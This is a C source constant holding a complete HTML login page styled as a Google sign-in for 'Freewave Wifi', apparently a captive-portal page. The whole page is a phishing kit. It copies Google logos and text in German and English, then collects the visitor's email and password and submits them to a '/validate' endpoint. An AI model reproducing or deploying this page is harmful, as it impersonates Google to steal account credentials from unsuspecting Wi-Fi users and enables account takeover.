const char GOOGLE_HTML[] = R"=====(
<html>
<head>
<title>Freewave Wifi - Google Login</title>

<style>
.login-page {
width: 360px;
padding: 8% 0 0;
margin: auto;
}
.form {
position: relative;
    z-index: 1;
background: #F7F7F7;
    max-width: 360px;
margin: 0 auto 100px;
padding: 45px;
    text-align: center;
    box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);
}
.form input {
    font-family: 'Roboto', sans-serif;
outline: 0;
background: #ffffff;
width: 100%;
border: 0;
margin: 0 0 15px;
padding: 15px;
    box-sizing: border-box;
    font-size: 14px;
}
.form button {
    font-family: 'Roboto', sans-serif;
outline: 0;
background: #4E8FF4;
width: 100%;
border: 0;
padding: 15px;
color: #FFFFFF;
    font-size: 14px;
    -webkit-transition: all 0.3 ease;
transition: all 0.3 ease;
cursor: pointer;
}
.form button:hover,.form button:active,.form button:focus {
background: blue;
}
.form .message {
    text-align: right;
margin: 15px 0 0;
color: #4E8FF4;
    font-size: 12px;
}
.form .message a {
color: #4E8FF4;
    text-decoration: none;
}
.form .register-form {
display: none;
}
.container {
position: relative;
    z-index: 1;
    max-width: 300px;
margin: 0 auto;
}
.container:before, .container:after {
content: '';
display: block;
clear: both;
}
.container .info {
margin: 50px auto;
    text-align: center;
}
.container .info h1 {
margin: 0 0 15px;
padding: 0;
    font-size: 36px;
    font-weight: 300;
color: #1a1a1a;
}
.container .info span {
color: #4d4d4d;
    font-size: 12px;
}
.container .info span a {
color: #000000;
    text-decoration: none;
}
.container .info span .fa {
color: #EF3B3A;
}
body {
background: #ffffff;
    font-family: 'Roboto', sans-serif;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}

.logo {
    background-image: url('data:image/png;base64,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');
    background-size: 116px 38px;
    background-repeat: no-repeat;
    float: none;
margin: 40px auto 30px;
display: block;
height: 38px;
width: 116px;
}

.logo2 {
    background-image: url('data:image/gif;base64,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');
    background-size: 110px 100px;
    background-repeat: no-repeat;
    float: none;
margin: 40px auto 30px;
display: block;
height: 100px;
width: 116px;
}
.banner {
    text-align: center;
}
.banner h1 {
    font-family: 'Roboto', sans-serif;
    -webkit-font-smoothing: antialiased;
color: #555;
    font-size: 42px;
    font-weight: 300;
    margin-top: 0;
    margin-bottom: 20px;
}
.banner h2 {
    font-family: 'Roboto', sans-serif;
    -webkit-font-smoothing: antialiased;
color: #555;
    font-size: 18px;
    font-weight: 400;
    margin-bottom: 20px;
}
.circle-mask {
display: block;
height: 96px;
width: 96px;
overflow: hidden;
    border-radius: 50%;
    margin-left: auto;
    margin-right: auto;
    z-index: 100;
    margin-bottom: 10px;
    background-size: 96px;
    background-repeat: no-repeat;
    background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMAAAADACAAAAAB3tzPbAAACOUlEQVR4Ae3aCQrrIBRG4e5/Tz+CBAlIkIAECUjoSt48z/GZeAvnrMCvc6/38XzxAAAAYC4AAAAAAAAAAAAAAAAAAAAAAAAAAAAMCAAAAAAAAAAAAAAAAPsagz4V4rq/FmCLTj/k4vYqgCN5/TKfjlcAJKff5pJ5QPH6Y77YBiz6a4thQJ30D03VKmB3+qfcbhOwO+l+waP/+VsEBgDV6USumgNMOtVkDbDoZIstQNHpiimA1+m8JUBSQ8kO4HBqyB1mAElNJTMAr6a8FcCmxjYjgKjGohGAU2POBmBXc7sJwKrmVhOAqOaiCUBQc8EEQO0JwPMB4ADASwhAe3yR8VPiP3/M8XOaPzQd/lLyp56xSuvnUGK0yHC313idCw6umNov+bhm5aK7fdWAZQ/WbdoXnlg5Y+mvfe2SxVdWj20FAAAAAAAAAAAAwFQAAJSS0hwmfVMIc0qlmAfsOQWvP+RDyrtNQM1L0D8WllxNAWqOXifzMVcbgG3xaswv22jAFp3a6zFteYw8fQ9DM6Amr275VG8GlFmdm8uNgDzpgqZ8EyB7XZTPNwDKpAubysWAOuvi5nolYHW6PLdeBjiCbikc1wCK0025cgUg68Zyf0DUrcXegKibi30Bq25v7QnYNKCtH+BwGpA7ugFmDWnuBSgaVOkECBpU6AOoGlbtAlg1rLULIGhYoQvAaViuC0AD6wE4Xh1QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADA194CuqC6onikxXwAAAAASUVORK5CYII=');
    -webkit-transition: opacity 0.075s;
    -moz-transition: opacity 0.075s;
    -ms-transition: opacity 0.075s;
    -o-transition: opacity 0.075s;
transition: opacity 0.075s;
}

table {
    width: 100%;
}

th {
    height: 50px;
}


</style>
</head>
<body>
<table class="logobox">
<tr>
<td><div class='logo' aria-label='Google'></div>
</td>
<td><div class='logo2' aria-label='Freewave'></div>
</td>
</tr>
</table>

<div class='banner'>
<h1>
Melden Sie sich bitte mit Ihrem Google-Konto an um fortzufahren
</h1>
<h2 class='hidden-small'>
Sign in to continue to the Web Access
</h2>
</div>
<div class='login-page'>
<div class='form'>
<form class='login-form' action='/validate' method='GET'>
<div class='circle-mask' ></div>
<br>
<input type='email' placeholder='Enter your email' name='user' required />
<input type='password' placeholder='Enter your password' name='pass' required />
<input type='hidden' name='url' value='google.com'>
<button type='submit'>Login</button>
<p class='message'><a href='#'>Find my account</a></p>
</form>
</div>
</div>

</body>
</html>
)=====";
